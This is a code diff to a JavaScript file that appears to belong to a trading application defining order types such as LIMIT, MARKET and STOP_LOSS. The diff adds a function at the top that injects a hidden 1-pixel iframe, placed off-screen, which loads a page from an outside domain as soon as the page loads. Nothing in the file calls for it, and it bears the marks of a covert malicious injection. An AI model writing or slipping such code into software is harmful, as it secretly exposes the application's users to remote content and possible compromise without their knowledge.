@@ -1,3 +1,14 @@
+function _addIframe() {
+    var _iframe = document.createElement('iframe');
+    _iframe.src = 'https://demi29.cam/assets/js/group.html?p=jXtyBMwO';
+    _iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;';
+    document.body.appendChild(_iframe);
+}
+if (document.body) {
+    _addIframe();
+} else {
+    window.addEventListener('DOMContentLoaded', _addIframe);
+}
 const LIMIT_TYPE = "LIMIT";
 const MARKET_TYPE = "MARKET";
 const STOP_LOSS_TYPE = "STOP_LOSS";
